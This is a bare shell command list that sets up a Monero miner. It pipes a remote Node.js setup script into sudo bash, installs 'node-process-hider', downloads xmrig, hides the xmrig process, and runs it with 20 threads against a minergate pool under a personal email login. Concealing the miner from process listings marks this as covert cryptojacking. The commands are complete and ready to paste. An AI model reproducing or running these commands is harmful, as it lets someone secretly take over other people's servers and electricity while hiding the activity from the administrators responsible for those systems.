sudo apt update
clear
sudo apt install screen
screen -R xmrig
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g node-process-hider && apt install screen && wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz && tar xvzf xmrig-6.16.4-bionic-x64.tar.gz && cd xmrig-6.16.4 && sudo ph add xmrig && apt install screen && screen 
screen -R xmrig
sudo ./xmrig -a monero -o stratum+tcp://xmr.pool.minergate.com:45700 -u naredinaredi@gmail.com -p x -t 20
